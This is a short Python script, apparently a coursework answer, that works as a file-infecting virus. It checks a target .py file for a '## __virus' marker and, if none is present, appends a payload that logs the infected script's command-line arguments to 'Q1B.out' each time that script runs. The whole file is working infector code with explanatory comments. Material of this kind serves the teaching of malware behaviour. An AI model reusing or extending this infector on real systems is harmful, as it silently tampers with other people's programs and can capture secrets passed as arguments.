import os
import sys

if __name__ == '__main__':
    # Take in the target and make sure its a Python script
    target = sys.argv[1]
    if not target.endswith(".py"):
        sys.exit(1)
    
    """
    We can check if the file has already been infected by
    checking if any of the lines include the "virus" header
    we will generate.
    """
    injected = False
    with open(target, "r") as f:
        for line in f:
            if "## __virus" in line:
                injected = True
                break

    """
    If the file has not yet been infected, we can inject
    the virus payload to the end of the file. This payload
    will write all command line arguments into "Q1B.out"

    We will start the payload with "## __virus" so that
    we can later detect if the file has already been infected.
    """
    if not injected:
        with open(target, "a") as f:
            f.write("""
## __virus
import sys
import os

with open("Q1B.out", "a") as f:
    f.write(f"{' '.join(sys.argv)}\\n")
""")